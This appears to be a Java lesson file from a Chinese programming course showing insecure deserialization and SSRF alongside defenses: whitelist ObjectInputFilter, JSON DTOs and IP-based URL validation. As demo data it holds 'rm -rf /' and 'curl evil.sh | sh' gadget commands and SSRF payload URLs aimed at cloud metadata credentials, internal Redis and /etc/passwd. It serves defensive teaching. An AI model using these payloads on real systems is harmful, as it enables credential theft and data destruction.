/**
 * ============================================================
 * 课程来源：黑马程序员《2026版 AI+Java 零基础全套视频课程》
 *            B站 BV1TJxCzSEEZ（阿玮老师）
 * 说明：官方课程视频到第 14 章结束，本章为按同一格式补充的扩展内容
 * 课号：36-08
 * 课名：不安全反序列化与 SSRF
 * ------------------------------------------------------------
 * 知识点：
 *   - **反序列化把「数据」变成「对象」，如果数据可控且能指定类，就等于让攻击者构造对象**。Java 原生反序列化（`ObjectInputStream.readObject`）尤其危险：它信任字节流里写的类名，会去加载并调用 `readObject`，从而触发任意代码。
 *   - ** gadget chain**：攻击者不直接写恶意类，而是把依赖库里已有的类串起来（如 `HashMap` → `TemplatesImpl`、CommonsCollections 链），最终执行命令。所以「有没有漏洞」取决于 classpath 里有没有可用的链。
 *   - **防护首选是「不用原生反序列化」**：改用 JSON（Jackson/Gson）+ 明确的 DTO。JSON 只能构造数据，不能指定类，没有 gadget 问题。
 *   - **如果必须反序列化，就上白名单 `ObjectInputFilter`**：只允许期望的类，其他一律拒绝。JDK 9+ 的 `ObjectInputFilter` 就是为此设计的。
 *   - **`readObject` 要限制深度和大小**：防「反序列化炸弹」（嵌套 `HashSet` 造成指数级 `hashCode` 调用，CPU 打满）。
 *   - **Jackson 的坑是「多态自动类型」**：开 `enableDefaultTyping()` 或 `@JsonTypeInfo` 用了 `Id.CLASS`/`Id.MINIMAL_CLASS`，攻击者就能在 JSON 里指定 `@class` 字段触发链。防护：**不用基于类名的多态**，或限定 `@JsonSubTypes` 白名单。
 *   - **Fastjson 的 `autoType` 同类风险**：历史上大量 CVE。原则一样 —— 不信任输入里的类型名。
 *   - **SSRF（服务端请求伪造）**：服务端有个「按 URL 抓取」的功能（图片代理、Webhook、导出 PDF），攻击者传 `http://169.254.169.254/latest/meta-data/` 去读云元数据，或 `http://127.0.0.1:6379/` 打内网 Redis。**本质是把服务端当成代理去打内网**。
 *   - **SSRF 防护不能只靠黑名单**（`127.0.0.1`、`192.168.*` 太容易被绕过：十进制 IP、八进制、`0.0.0.0`、DNS 重绑定、302 跳转）。正确做法：**「先解析成 IP，再基于 IP 判断是否内网，然后直连这个 IP 并带上原始 Host/SNI」**，同时禁用跟随跳转，或每一跳都重新校验。
 *   - **SSRF 的加固组合**：URL 协议白名单（只允许 `http`/`https`）、出站走独立网段 + 防火墙禁止访问元数据地址、设置超时和响应大小上限、失败信息不要回显内部细节。
 *   - 易错点：只在第一跳校验 URL、允许任意重定向；用字符串做黑名单匹配；把内网服务当作「反正是内网所以安全」；反序列化接口对外网开放。
 * ============================================================
 */

package com.heima.ch36;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputFilter;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URI;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

// ==================== 示例代码 ====================

public class DeserializeSsrf {
    /** 允许被反序列化的类型：白名单，只有它和数据成员 */
    record Money(long cents, String currency) implements Serializable {
    }

    static byte[] serialize(Object o) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(o);
            return bos.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    static Object readUnsafe(byte[] data) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        } catch (Exception e) {
            return "反序列化异常：" + e.getClass().getSimpleName();
        }
    }

    static Object readWithFilter(byte[] data, String pattern) {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(pattern));
            return ois.readObject();
        } catch (Exception e) {
            return "被拦截：" + e.getClass().getSimpleName();
        }
    }

    /** 模拟「危险类」：真实里是 TemplatesImpl、CommonsCollections 之类 */
    static class DangerousGadget implements Serializable {
        private static final long serialVersionUID = 1L;
        final String command;

        DangerousGadget(String command) {
            this.command = command;
        }

        private void readObject(ObjectInputStream in)
                throws java.io.IOException, ClassNotFoundException {
            in.defaultReadObject();
            System.out.println("    [gadget 在 readObject 里执行了] cmd=" + command);
        }
    }

    static void whyNativeIsDangerous() {
        System.out.println("【原生反序列化：字节流里的类名被信任】");
        byte[] good = serialize(new Money(1999, "CNY"));
        System.out.println("  正常数据 " + good.length + " 字节，读出来 -> " + readUnsafe(good));
        System.out.println();
        byte[] evil = serialize(new DangerousGadget("rm -rf /"));
        System.out.println("  恶意数据 " + evil.length + " 字节，直接读：");
        System.out.println("    结果 -> " + readUnsafe(evil));
        System.out.println("  问题：readObject 被自动调用，构造对象时就执行了副作用");
        System.out.println("  真实 gadget 链不需要自定义类，用依赖库里的类就能达成");
        System.out.println();
    }

    static void whitelistFilter() {
        System.out.println("【ObjectInputFilter：只放行白名单类】");
        byte[] good = serialize(new Money(1999, "CNY"));
        byte[] evil = serialize(new DangerousGadget("curl evil.sh | sh"));

        String pattern = "DeserializeSsrf$Money;java.lang.Long;java.lang.String;!*";
        System.out.println("  filter: " + pattern);
        System.out.println("    正常数据 -> " + readWithFilter(good, pattern));
        System.out.println("    恶意数据 -> " + readWithFilter(evil, pattern));
        System.out.println("  规则：列出允许的类，末尾 !* 表示其余全部拒绝");
        System.out.println("  再加一层：限制数组长度、对象深度、字节数上限，防反序列化炸弹");
        System.out.println();
    }

    static void preferJson() {
        System.out.println("【首选：换掉原生序列化】");
        String[][] rows = {
                {"Java 原生", "可指定任意类，有 gadget 风险", "不要用于跨边界数据"},
                {"JSON + DTO", "只能构造数据，类固定", "推荐，接口首选"},
                {"Protobuf/Thrift", "schema 固定，无类型注入", "服务间通信推荐"},
                {"YAML（SnakeYAML 旧版）", "!! 可指定类", "用 safeLoads / 新版本"},
                {"XML（XStream 等）", "可指定类", "禁止或严格白名单"},
        };
        for (String[] r : rows) {
            System.out.println("  " + pad(r[0], 20) + " | " + pad(r[1], 26) + " | " + r[2]);
        }
        System.out.println();
        System.out.println("  Jackson 特别提醒：别开 enableDefaultTyping()");
        System.out.println("    @JsonTypeInfo(use = Id.CLASS) 会读输入里的类名 -> 等于原生反序列化的坑");
        System.out.println("    多态要用 @JsonSubTypes 显式列白名单，或用逻辑名而非类名");
        System.out.println();
    }

    static void ssrfIntro() {
        System.out.println("【SSRF：让服务端去访问内网】");
        System.out.println("  功能：POST /api/fetch-image  body: {\"url\": \"...\"}");
        String[] attacks = {
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/  <- 偷云凭证",
                "http://127.0.0.1:6379/  <- 触达内网 Redis",
                "http://192.168.1.1/admin  <- 打内网管理后台",
                "http://[::1]:8080/actuator/env  <- IPv6 环回绕过",
                "file:///etc/passwd  <- 读本地文件（若支持 file 协议）",
        };
        for (String a : attacks) {
            System.out.println("    " + a);
        }
        System.out.println("  统计：服务端能访问的东西，比攻击者自己能访问的多得多");
        System.out.println();
    }

    /** 演示用的静态 DNS 表，避免依赖真实解析结果 */
    static final Map<String, String> FAKE_DNS = new LinkedHashMap<>();

    static {
        FAKE_DNS.put("images.example.com", "203.0.113.20");
        FAKE_DNS.put("internal.corp", "10.0.5.7");
        FAKE_DNS.put("rebind.example.com", "203.0.113.99");
    }

    static long parseNumber(String s) {
        try {
            if (s.startsWith("0x") || s.startsWith("0X")) {
                return Long.parseLong(s.substring(2), 16);
            }
            if (s.length() > 1 && s.charAt(0) == '0') {
                return Long.parseLong(s.substring(1), 8);
            }
            return Long.parseLong(s);
        } catch (NumberFormatException e) {
            return -1;
        }
    }

    /** 把各种 IP 写法归一化成点分十进制；不是 IP 字面量则返回 null */
    static String toDotted(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        if (host.startsWith("[") && host.endsWith("]")) {
            return host.substring(1, host.length() - 1);
        }
        if (host.indexOf('.') < 0) {
            long v = parseNumber(host);
            if (v < 0 || v > 0xFFFFFFFFL) {
                return null;
            }
            return ((v >> 24) & 255) + "." + ((v >> 16) & 255) + "."
                    + ((v >> 8) & 255) + "." + (v & 255);
        }
        String[] p = host.split("\\.", -1);
        if (p.length == 4) {
            long[] n = new long[4];
            for (int i = 0; i < 4; i++) {
                n[i] = parseNumber(p[i]);
                if (n[i] < 0 || n[i] > 255) {
                    return null;
                }
            }
            return n[0] + "." + n[1] + "." + n[2] + "." + n[3];
        }
        if (p.length == 2) {
            long a = parseNumber(p[0]);
            long b = parseNumber(p[1]);
            if (a < 0 || a > 255 || b < 0 || b > 0xFFFFFF) {
                return null;
            }
            return a + "." + ((b >> 16) & 255) + "." + ((b >> 8) & 255) + "." + (b & 255);
        }
        return null;
    }

    /** getHost() 对 127.1、2130706433 这类写法可能返回 null，回退到 authority 并去掉端口 */
    static String hostOf(URI uri) {
        String host = uri.getHost();
        if (host != null && !host.isEmpty()) {
            return host;
        }
        String auth = uri.getAuthority();
        if (auth == null) {
            return null;
        }
        int at = auth.lastIndexOf('@');
        if (at >= 0) {
            auth = auth.substring(at + 1);
        }
        if (auth.startsWith("[")) {
            int close = auth.indexOf(']');
            return close > 0 ? auth.substring(0, close + 1) : auth;
        }
        int colon = auth.indexOf(':');
        return colon >= 0 ? auth.substring(0, colon) : auth;
    }

    static String resolveHost(String host) {
        if (host == null || host.isEmpty()) {
            return null;
        }
        String fake = FAKE_DNS.get(host);
        return fake != null ? fake : toDotted(host);
    }

    /** 按解析出的 IP 判归属，而不是按字符串 */
    static String classify(String ip) {
        if (ip.contains(":")) {
            if (ip.equals("::1") || ip.equals("::") || ip.startsWith("fe80")
                    || ip.startsWith("fc") || ip.startsWith("fd")) {
                return "内网/环回";
            }
            return "公网";
        }
        String[] p = ip.split("\\.");
        int a = Integer.parseInt(p[0]);
        int b = Integer.parseInt(p[1]);
        if (a == 127 || a == 10 || a == 0) {
            return "内网/环回";
        }
        if (a == 169 && b == 254) {
            return "链路本地（云元数据）";
        }
        if (a == 192 && b == 168) {
            return "内网";
        }
        if (a == 172 && b >= 16 && b <= 31) {
            return "内网";
        }
        if (a == 100 && b >= 64 && b <= 127) {
            return "运营商级 NAT";
        }
        return "公网";
    }

    static String validateUrl(String raw) {
        URI uri;
        try {
            uri = URI.create(raw);
        } catch (Exception e) {
            return "拒绝：URL 非法";
        }
        String scheme = uri.getScheme();
        if (scheme == null || !(scheme.equals("http") || scheme.equals("https"))) {
            return "拒绝：协议不在白名单（" + scheme + "）";
        }
        String host = hostOf(uri);
        if (host == null || host.isEmpty()) {
            return "拒绝：缺少主机名";
        }
        String ip = resolveHost(host);
        if (ip == null) {
            return "拒绝：无法解析主机（" + host + "）";
        }
        String kind = classify(ip);
        if (!kind.equals("公网")) {
            return "拒绝：" + kind + "（" + host + " -> " + ip + "）";
        }
        int port = uri.getPort() < 0 ? (scheme.equals("https") ? 443 : 80) : uri.getPort();
        return "通过 -> 直连 " + ip + ":" + port + "（Host: " + host + "）";
    }

    static void ssrfDefenses() {
        System.out.println("【SSRF 防护：先解析 IP，再按 IP 判断】");
        String[] inputs = {
                "https://images.example.com/a.png",
                "http://127.0.0.1/admin",
                "http://169.254.169.254/latest/meta-data/",
                "http://2130706433/",
                "file:///etc/passwd",
                "http://internal.corp:8080/",
        };
        for (String s : inputs) {
            System.out.println("  " + pad(s, 40) + " -> " + validateUrl(s));
        }
        System.out.println("  通过的那条是「直连 IP + 覆盖 Host」，这样 DNS 再重绑定也改不了目标");
        System.out.println();
    }

    static boolean naiveBlacklist(String raw) {
        String lower = raw.toLowerCase();
        return lower.contains("127.0.0.1") || lower.contains("localhost")
                || lower.contains("169.254") || lower.contains("192.168.")
                || lower.contains("10.0.");
    }

    static void ssrfBypasses() {
        System.out.println("【为什么黑名单字符串匹配挡不住】");
        String[] urls = {
                "http://127.0.0.1/",
                "http://2130706433/",
                "http://0x7f000001/",
                "http://127.1/",
                "http://[::1]/",
                "http://192.168.1.1/",
                "http://169.254.169.254/",
        };
        System.out.println("  " + pad("输入", 24) + " | " + pad("解析结果", 16) + " | "
                + pad("真实归属", 22) + " | 黑名单");
        for (String u : urls) {
            String host = hostOf(URI.create(u));
            String ip = resolveHost(host);
            String kind = ip == null ? "无法解析" : classify(ip);
            String blocked = naiveBlacklist(u) ? "挡住" : "漏过";
            System.out.println("  " + pad(u, 24) + " | " + pad(String.valueOf(ip), 16) + " | "
                    + pad(kind, 22) + " | " + blocked);
        }
        System.out.println();
        System.out.println("  还有两种黑名单根本看不到的：");
        System.out.println("    http://evil.com -> 302 -> http://127.0.0.1/   只校验首跳就漏");
        System.out.println("    http://rebind.example.com/                   校验时是公网，请求时变内网");
        System.out.println();
        System.out.println("  正确组合：");
        System.out.println("    1) 协议白名单 http/https，禁用 file/gopher/dict");
        System.out.println("    2) 解析出 IP 后判内网，然后直连该 IP（防重绑定）");
        System.out.println("    3) 禁止自动跟随跳转；必要时每跳重新校验");
        System.out.println("    4) 出站放独立网段，防火墙禁 169.254.169.254 与内网段");
        System.out.println("    5) 超时、响应大小上限、不回显内部错误细节");
        System.out.println();
    }

    static void checklist() {
        System.out.println("【边界数据安全清单】");
        List<String> items = new ArrayList<>(List.of(
                "对外接口不用 Java 原生反序列化",
                "必须用时配 ObjectInputFilter 白名单 + 深度/大小限制",
                "禁用 Jackson default typing；多态用 @JsonSubTypes 白名单",
                "URL 抓取类功能：协议白名单 + IP 判内网 + 禁跳转",
                "云主机开启 IMDSv2（要求 token），降低元数据被读风险",
                "出站流量走专用出口，能审计、能限流",
                "错误信息不暴露内网拓扑与实现细节"));
        Map<String, Boolean> audited = new LinkedHashMap<>();
        for (String s : items) {
            audited.put(s, false);
        }
        int i = 1;
        for (String s : audited.keySet()) {
            System.out.printf("  [ ] %d. %s%n", i++, s);
        }
        System.out.println();
    }

    static String pad(String s, int width) {
        int w = 0;
        for (int i = 0; i < s.length(); i++) {
            w += s.charAt(i) > 0x2E80 ? 2 : 1;
        }
        return s + " ".repeat(Math.max(width - w, 0));
    }

    public static void main(String[] args) {
        whyNativeIsDangerous();
        whitelistFilter();
        preferJson();
        ssrfIntro();
        ssrfDefenses();
        ssrfBypasses();
        checklist();
    }
}

/*
 * ============================================================
 * 课后练习题（无参考答案）
 * ------------------------------------------------------------
 * 1. 给 `readWithFilter` 增加「最大字节数」和「最大深度」限制，构造一个反序列化炸弹（深层嵌套容器）验证会被挡下。
 * 2. 改进 `validateUrl`：解析出 IP 后不再用主机名请求，写出「直连 IP + 覆盖 Host 头」的实现思路（伪代码即可）。
 * 3. 列出你熟悉的框架里所有「按用户输入加载类/协议」的配置项（Jackson、XStream、SnakeYAML、Spring 的 SpEL），各写一条安全基线。
 * 4. 思考题：为什么「只在内网部署」不能作为 SSRF 的缓解措施？举一个内网被 SSRF 打穿的后果。
 * ============================================================
 */
